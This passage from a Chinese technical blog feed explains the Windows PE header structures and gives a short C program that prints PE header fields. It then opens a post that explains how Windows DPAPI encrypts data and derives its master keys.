<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213071611782.png" alt="image-20220213071611782" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>WORD    Machine<span class="token punctuation">;</span>                <span class="token comment">// 可以运行在什么样的 CPU 上 任意：0 Intel 386 以及后续：14C x64：8864</span></pre></td></tr><tr><td data-num="2"></td><td><pre>WORD    NumberOfSections<span class="token punctuation">;</span>       <span class="token comment">// 表示节的数量</span></pre></td></tr><tr><td data-num="3"></td><td><pre>DWORD   TimeDateStamp<span class="token punctuation">;</span>          <span class="token comment">// 编译器填写的时间戳，与文件属性里面的创建时间、修改时间无关</span></pre></td></tr><tr><td data-num="4"></td><td><pre>DWORD   PointerToSymbolTable<span class="token punctuation">;</span>   <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD   NumberOfSymbols<span class="token punctuation">;</span>        <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="6"></td><td><pre>WORD    SizeOfOptionalHeader<span class="token punctuation">;</span>   <span class="token comment">// 可选 PE 头的大小 (32 位 PE 文件：0xE0 64 位 PE 文件：0xF0)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>WORD    Characteristics<span class="token punctuation">;</span>        <span class="token comment">// 文件属性</span></pre></td></tr></table></figure><table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Machine</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSections</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">TimeDateStamp</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">PointerToSymbolTable</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSymbols</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">SizeOfOptionalHeader</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">Characteristics</td>
<td style="text-align:left">2 字节</td>
</tr>
</tbody>
</table>
<p>宏定义：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213071509571.png" alt="image-20220213071509571" /></p>
<p>通过 PE 编辑器可以查看文件信息，从而便于编写程序</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213071746220.png" alt="image-20220213071746220" /></p>
<h3 id="常用区段"><a class="anchor" href="#常用区段">#</a> 常用区段</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>text <span class="token punctuation">.</span>code <span class="token comment">// 代码段</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>data <span class="token comment">// 可读写数据段，存放全局变量和 C 盘变量</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>rdata <span class="token comment">// 只读数据段</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">.</span>idata <span class="token comment">// 导入数据段</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>edata <span class="token comment">// 导出数据段</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">.</span>rsrc <span class="token comment">// 资源段</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>bss <span class="token comment">// 未初始化数据</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">.</span>crt <span class="token comment">// 用于 C++ 运行时 (CRT) 所添加的数据</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>tls <span class="token comment">// 线程局部存储器，这包括数据的初始化值，也包括运行时所需要的额外变量</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">.</span>reloc <span class="token comment">// 可执行文件的基址重定位</span></pre></td></tr></table></figure><h3 id="常见pe属性"><a class="anchor" href="#常见pe属性">#</a> 常见 PE 属性</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213073745540.png" alt="image-20220213073745540" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_RELOCS_STRIPPED</span>           <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Relocation info stripped from file.</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_EXECUTABLE_IMAGE</span>          <span class="token expression"><span class="token number">0x0002</span>  </span><span class="token comment">// File is executable  (i.e. no unresolved external references).</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LINE_NUMS_STRIPPED</span>        <span class="token expression"><span class="token number">0x0004</span>  </span><span class="token comment">// Line nunbers stripped from file.</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LOCAL_SYMS_STRIPPED</span>       <span class="token expression"><span class="token number">0x0008</span>  </span><span class="token comment">// Local symbols stripped from file.</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_AGGRESIVE_WS_TRIM</span>         <span class="token expression"><span class="token number">0x0010</span>  </span><span class="token comment">// Aggressively trim working set</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LARGE_ADDRESS_AWARE</span>       <span class="token expression"><span class="token number">0x0020</span>  </span><span class="token comment">// App can handle >2gb addresses</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_LO</span>         <span class="token expression"><span class="token number">0x0080</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_32BIT_MACHINE</span>             <span class="token expression"><span class="token number">0x0100</span>  </span><span class="token comment">// 32 bit word machine.</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DEBUG_STRIPPED</span>            <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Debugging info stripped from file in .DBG file</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</span>   <span class="token expression"><span class="token number">0x0400</span>  </span><span class="token comment">// If Image is on removable media, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_NET_RUN_FROM_SWAP</span>         <span class="token expression"><span class="token number">0x0800</span>  </span><span class="token comment">// If Image is on Net, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_SYSTEM</span>                    <span class="token expression"><span class="token number">0x1000</span>  </span><span class="token comment">// System File.</span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DLL</span>                       <span class="token expression"><span class="token number">0x2000</span>  </span><span class="token comment">// File is a DLL.</span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_UP_SYSTEM_ONLY</span>            <span class="token expression"><span class="token number">0x4000</span>  </span><span class="token comment">// File should only be run on a UP machine</span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_HI</span>         <span class="token expression"><span class="token number">0x8000</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_UNKNOWN</span>           <span class="token expression"><span class="token number">0</span></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TARGET_HOST</span>       <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Useful for indicating we want to interact with the host and not a WoW guest.</span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_I386</span>              <span class="token expression"><span class="token number">0x014c</span>  </span><span class="token comment">// Intel 386.</span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R3000</span>             <span class="token expression"><span class="token number">0x0162</span>  </span><span class="token comment">// MIPS little-endian, 0x160 big-endian</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R4000</span>             <span class="token expression"><span class="token number">0x0166</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_R10000</span>            <span class="token expression"><span class="token number">0x0168</span>  </span><span class="token comment">// MIPS little-endian</span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_WCEMIPSV2</span>         <span class="token expression"><span class="token number">0x0169</span>  </span><span class="token comment">// MIPS little-endian WCE v2</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA</span>             <span class="token expression"><span class="token number">0x0184</span>  </span><span class="token comment">// Alpha_AXP</span></span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3</span>               <span class="token expression"><span class="token number">0x01a2</span>  </span><span class="token comment">// SH3 little-endian</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3DSP</span>            <span class="token expression"><span class="token number">0x01a3</span></span></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH3E</span>              <span class="token expression"><span class="token number">0x01a4</span>  </span><span class="token comment">// SH3E little-endian</span></span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH4</span>               <span class="token expression"><span class="token number">0x01a6</span>  </span><span class="token comment">// SH4 little-endian</span></span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_SH5</span>               <span class="token expression"><span class="token number">0x01a8</span>  </span><span class="token comment">// SH5</span></span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM</span>               <span class="token expression"><span class="token number">0x01c0</span>  </span><span class="token comment">// ARM Little-Endian</span></span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_THUMB</span>             <span class="token expression"><span class="token number">0x01c2</span>  </span><span class="token comment">// ARM Thumb/Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARMNT</span>             <span class="token expression"><span class="token number">0x01c4</span>  </span><span class="token comment">// ARM Thumb-2 Little-Endian</span></span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AM33</span>              <span class="token expression"><span class="token number">0x01d3</span></span></span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPC</span>           <span class="token expression"><span class="token number">0x01F0</span>  </span><span class="token comment">// IBM PowerPC Little-Endian</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_POWERPCFP</span>         <span class="token expression"><span class="token number">0x01f1</span></span></span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_IA64</span>              <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Intel 64</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPS16</span>            <span class="token expression"><span class="token number">0x0266</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ALPHA64</span>           <span class="token expression"><span class="token number">0x0284</span>  </span><span class="token comment">// ALPHA64</span></span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU</span>           <span class="token expression"><span class="token number">0x0366</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_MIPSFPU16</span>         <span class="token expression"><span class="token number">0x0466</span>  </span><span class="token comment">// MIPS</span></span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AXP64</span>             <span class="token expression">IMAGE_FILE_MACHINE_ALPHA64</span></span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_TRICORE</span>           <span class="token expression"><span class="token number">0x0520</span>  </span><span class="token comment">// Infineon</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEF</span>               <span class="token expression"><span class="token number">0x0CEF</span></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_EBC</span>               <span class="token expression"><span class="token number">0x0EBC</span>  </span><span class="token comment">// EFI Byte Code</span></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_AMD64</span>             <span class="token expression"><span class="token number">0x8664</span>  </span><span class="token comment">// AMD64 (K8)</span></span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_M32R</span>              <span class="token expression"><span class="token number">0x9041</span>  </span><span class="token comment">// M32R little-endian</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_ARM64</span>             <span class="token expression"><span class="token number">0xAA64</span>  </span><span class="token comment">// ARM64 Little-Endian</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_MACHINE_CEE</span>               <span class="token expression"><span class="token number">0xC0EE</span></span></span></pre></td></tr></table></figure><p><code>typedef struct _IMAGE_OPTIONAL_HEADER</code>  定义</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213074527728.png" alt="image-20220213074527728" /></p>
<p>AddressOfEntryPoint：程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</p>
<ul>
<li>VA：Virtual Adress 00000000h-0fffffffh 进程的基地址 + 相对虚拟内存地址</li>
<li>RVA ：Reversc Virtual Adress 相对虚拟内存地址 针对某一个模块而存在</li>
<li>FOA：File Offset Address 文件偏移地址</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Magic</td>
<td style="text-align:left">2 字节</td>
<td style="text-align:left">PE32：10B、PE32+(64)：20B，可以用来确认是 32 位还是 64 位程序</td>
</tr>
<tr>
<td style="text-align:left">MajorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">MinorLinkerVersion</td>
<td style="text-align:left">1 字节</td>
<td style="text-align:left">链接器版本号</td>
</tr>
<tr>
<td style="text-align:left">SizeOfCode</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">所有代码节的总和，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">SizeOfInitializedData</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">包含所有已经初始化数据的节的总大小，文件对齐后的大小，由编译器填写</td>
</tr>
<tr>
<td style="text-align:left">AddressOfEntryPoint</td>
<td style="text-align:left">4 字节</td>
<td style="text-align:left">程序入口，当前 PE 文件从哪个位置开始执行，配合 ImageBase (内存镜像基址) 来看</td>
</tr>
</tbody>
</table>
<h3 id="执行程序"><a class="anchor" href="#执行程序">#</a> 执行程序</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213075850476.png" alt="image-20220213075850476" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213075943206.png" alt="image-20220213075943206" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows信息搜集篇（五）之DPAPI 数据加密与Dns域传送漏洞利用</title>
    <url>/article/e26d51b.html</url>
    <content><![CDATA[<h2 id="dpapi-数据加密"><a class="anchor" href="#dpapi-数据加密">#</a> DPAPI 数据加密</h2>
<h3 id="00x01-什么是dpapi"><a class="anchor" href="#00x01-什么是dpapi">#</a> 00x01 什么是 DPAPI</h3>
<p><code>DPAPI</code>  是 <code>Windows</code>  系统级对数据进行加解密的一种接口，无需自实现加解密代码，微软已经提供了经过验证的高质量加解密算法，提供了用户态的接口，对密钥的推导，存储，数据加解密实现透明，并提供较高的安全保证。</p>
<p><code>DPAPI</code>  提供了两个用户态接口， <code>CryptProtectData</code>  加密数据， <code>CryptUnprotectData</code>  解密数据，加密后的数据由应用程序负责安全存储，应用无需解析加密后的数据格式。但是，加密后的数据存储需要一定的机制，因为该数据可以被其他任何进程用来解密，当然 <code>CryptProtectData</code>  也提供了用户输入额外数据来参与对用户数据进行加密的参数，但依然无法放于暴力破解。</p>
<p>总体来说，程序可以使用 <code>DPAPI</code>  来对自己敏感的数据进行加解密，也可持久化存储，程序或系统重启后可解密密文获取原文。如果应用程序，对此敏感数据只是暂存于内存，为了防止被黑客 <code>dump</code>  内存后进行破解，也对此数据无需进行持久化存储，微软还提供了加解密内存的接口 <code>CryptProtectMemory</code>  和 <code>CryptUnprotectMemory</code> 。加解密内存的接口，并可指定 Flag 对此内存加解密的声明周期做控制，详细见 <code>Memory</code>  加密及优缺点章节。</p>
<h3 id="00x02-dpapi的会话密钥推导"><a class="anchor" href="#00x02-dpapi的会话密钥推导">#</a> 00x02 DPAPI 的会话密钥推导</h3>
<p><code>DPAPI</code>  使用的会话密钥由 <code>MasterKey</code>  和随机数的 <code>HASH</code>  推导产生，而 <code>MasterKey</code>  的保护由用户登录密码 <code>HASH</code> ，随机数，和迭代次数通过可靠的 <code>PBKDF2</code>  密钥推导算法生成。其中迭代次数可以修改，  <code>MasterKeyIterationCount</code>  存储在  <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Protect\Providers\GUID</code>  允许系统管理员增加此迭代计数的密钥中。但是，它不能减少到 4000 以下。</p>
